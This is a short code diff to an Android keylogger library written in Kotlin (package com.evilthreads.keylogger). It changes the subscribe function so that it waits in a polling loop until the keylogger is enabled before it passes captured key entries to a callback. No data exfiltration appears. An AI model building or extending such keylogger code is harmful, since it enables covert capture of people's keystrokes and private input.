@@ -16,6 +16,7 @@ package com.evilthreads.keylogger
 import android.content.Context
 import android.content.Intent
 import kotlinx.coroutines.channels.Channel
+import kotlinx.coroutines.delay
 
 /*
             (   (                ) (             (     (
@@ -46,7 +47,11 @@ object Keylogger{
 
     fun resetPatterns() = patterns.clear()
 
+    //working on turning KeyloggerState into a subject and doing this with an observer
+    //waits for keylogger to start then subscribes
     suspend fun subscribe(block: (KeyloggerEntry) -> Unit){
+        while(!KeyloggerState.isEnabled())
+            delay(500)
         for(entry in channel){
             block(entry)
         }
